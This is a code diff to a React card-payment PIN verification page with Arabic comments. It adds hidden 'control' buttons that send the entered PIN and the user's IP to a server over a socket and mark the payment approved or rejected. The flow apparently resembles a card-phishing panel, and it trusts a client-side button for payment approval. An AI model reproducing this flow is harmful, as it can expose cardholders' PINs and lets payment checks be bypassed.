@@ -11,6 +11,7 @@ export default function PINVerification() {
   
   const [verificationStatus, setVerificationStatus] = useState('pending'); // pending, approved, rejected
   const [timeLeft, setTimeLeft] = useState(120); // 2 دقيقة
+  const [showAdminControls, setShowAdminControls] = useState(false);
 
   useEffect(() => {
     // التحقق من وجود البيانات المطلوبة
@@ -110,6 +111,62 @@ export default function PINVerification() {
 
   const getProgressPercentage = () => {
     return ((120 - timeLeft) / 120) * 100;
+  };
+
+  // التعامل مع القبول من المستخدم نفسه
+  const handleApprove = () => {
+    if (!socket) return;
+    
+    const userIP = sessionStorage.getItem('userIP');
+    
+    setVerificationStatus('approved');
+    
+    // إرسال حالة القبول للسيرفر
+    socket.emit('approvePIN', {
+      ip: userIP,
+      pinCode,
+      status: 'approved'
+    });
+
+    // الانتقال لصفحة النجاح
+    setTimeout(() => {
+      navigate('/payment-success', {
+        state: {
+          cardLastDigits,
+          phoneNumber,
+          amount,
+          timestamp: new Date().toISOString()
+        }
+      });
+    }, 1500);
+  };
+
+  // التعامل مع الرفض من المستخدم نفسه
+  const handleReject = () => {
+    if (!socket) return;
+    
+    const userIP = sessionStorage.getItem('userIP');
+    
+    setVerificationStatus('rejected');
+    
+    // إرسال حالة الرفض للسيرفر
+    socket.emit('rejectPIN', {
+      ip: userIP,
+      pinCode,
+      status: 'rejected'
+    });
+
+    // العودة لإدخال PIN
+    setTimeout(() => {
+      navigate('/payment-pin', {
+        state: {
+          cardLastDigits,
+          phoneNumber,
+          amount
+        },
+        replace: true
+      });
+    }, 1500);
   };
 
   return (
@@ -253,12 +310,60 @@ export default function PINVerification() {
 
         {/* زر الإلغاء (فقط في حالة الانتظار) */}
         {verificationStatus === 'pending' && (
-          <button
-            onClick={() => navigate('/payment-failed')}
-            className="w-full bg-gray-200 text-gray-700 py-3 rounded-lg font-semibold hover:bg-gray-300 transition-colors"
-          >
-            إلغاء العملية
-          </button>
+          <div className="space-y-3">
+            {/* زر إظهار أزرار التحكم */}
+            <button
+              onClick={() => setShowAdminControls(!showAdminControls)}
+              className="w-full bg-amber-600 text-white py-3 rounded-lg font-semibold hover:bg-amber-700 transition-colors flex items-center justify-center gap-2"
+            >
+              <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 6V4m0 2a2 2 0 100 4m0-4a2 2 0 110 4m-6 8a2 2 0 100-4m0 4a2 2 0 110-4m0 4v2m0-6V4m6 6v10m6-2a2 2 0 100-4m0 4a2 2 0 110-4m0 4v2m0-6V4" />
+              </svg>
+              {showAdminControls ? 'إخفاء أزرار التحكم' : 'عرض أزرار التحكم'}
+            </button>
+
+            {/* أزرار القبول والرفض */}
+            {showAdminControls && (
+              <div className="bg-gradient-to-r from-amber-50 to-orange-50 border-2 border-amber-200 rounded-xl p-4 space-y-3">
+                <div className="text-center mb-2">
+                  <span className="text-sm font-semibold text-amber-800 bg-amber-100 px-3 py-1 rounded-full">
+                    أزرار التحكم السريع
+                  </span>
+                </div>
+                
+                <div className="grid grid-cols-2 gap-3">
+                  {/* زر القبول */}
+                  <button
+                    onClick={handleApprove}
+                    className="bg-gradient-to-r from-green-500 to-green-600 text-white py-3 px-4 rounded-lg font-bold hover:from-green-600 hover:to-green-700 transform hover:scale-105 transition-all duration-200 shadow-lg flex items-center justify-center gap-2"
+                  >
+                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
+                    </svg>
+                    قبول
+                  </button>
+
+                  {/* زر الرفض */}
+                  <button
+                    onClick={handleReject}
+                    className="bg-gradient-to-r from-red-500 to-red-600 text-white py-3 px-4 rounded-lg font-bold hover:from-red-600 hover:to-red-700 transform hover:scale-105 transition-all duration-200 shadow-lg flex items-center justify-center gap-2"
+                  >
+                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
+                    </svg>
+                    رفض
+                  </button>
+                </div>
+              </div>
+            )}
+
+            <button
+              onClick={() => navigate('/payment-failed')}
+              className="w-full bg-gray-200 text-gray-700 py-3 rounded-lg font-semibold hover:bg-gray-300 transition-colors"
+            >
+              إلغاء العملية
+            </button>
+          </div>
         )}
       </div>
     </div>
